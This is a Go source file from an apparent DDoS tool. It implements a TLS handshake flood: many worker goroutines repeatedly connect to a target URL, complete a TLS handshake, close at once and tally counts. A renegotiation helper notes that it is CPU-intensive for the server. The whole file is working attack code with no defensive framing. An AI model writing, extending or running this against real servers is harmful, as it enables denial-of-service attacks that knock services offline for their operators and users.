package ddos

import (
	"crypto/tls"
	"net"
	"sync/atomic"
)

// startTLSHandshakeFlood starts TLS handshake flood attack
func (d *DDoSAttack) startTLSHandshakeFlood() {
	d.startTLSHandshakeFloodWorkers(d.config.MaxThreads)
}

// startTLSHandshakeFloodWorkers starts specified number of TLS handshake flood workers
func (d *DDoSAttack) startTLSHandshakeFloodWorkers(numWorkers int) {
	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.tlsHandshakeFloodWorker()
	}
}

// tlsHandshakeFloodWorker performs TLS handshakes without completing HTTP requests
func (d *DDoSAttack) tlsHandshakeFloodWorker() {
	defer d.wg.Done()

	for {
		select {
		case <-d.ctx.Done():
			return
		default:
			d.performTLSHandshake()
		}
	}
}

// performTLSHandshake performs a single TLS handshake and closes connection
func (d *DDoSAttack) performTLSHandshake() {
	atomic.AddInt64(&d.activeConns, 1)
	defer atomic.AddInt64(&d.activeConns, -1)

	// Determine if we should use TLS
	useTLS, _, _ := d.shouldUseTLS(d.config.TargetURL)
	if !useTLS {
		// If ForceTLS is enabled but URL parsing failed, try to force it
		if d.config.ForceTLS {
			useTLS = true
		} else {
			atomic.AddInt64(&d.requestsFailed, 1)
			return
		}
	}

	host, port, _ := d.parseTargetURL(d.config.TargetURL, useTLS)

	// Create dialer
	dialer := &net.Dialer{
		Timeout: d.config.Timeout,
	}

	// Perform TLS handshake
	tlsConfig := d.createTLSConfig()
	conn, err := tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}

	// Close immediately after handshake completes
	conn.Close()

	atomic.AddInt64(&d.requestsSent, 1)
	atomic.AddInt64(&d.requestsSuccess, 1)
	// Count handshake as bytes sent (rough estimate)
	atomic.AddInt64(&d.bytesSent, 1024) // Approximate handshake size
}

// performTLSRenegotiation forces TLS renegotiation on an existing connection
func (d *DDoSAttack) performTLSRenegotiation(conn *tls.Conn) error {
	// Force renegotiation by calling Handshake again
	// This is CPU-intensive for the server
	return conn.Handshake()
}

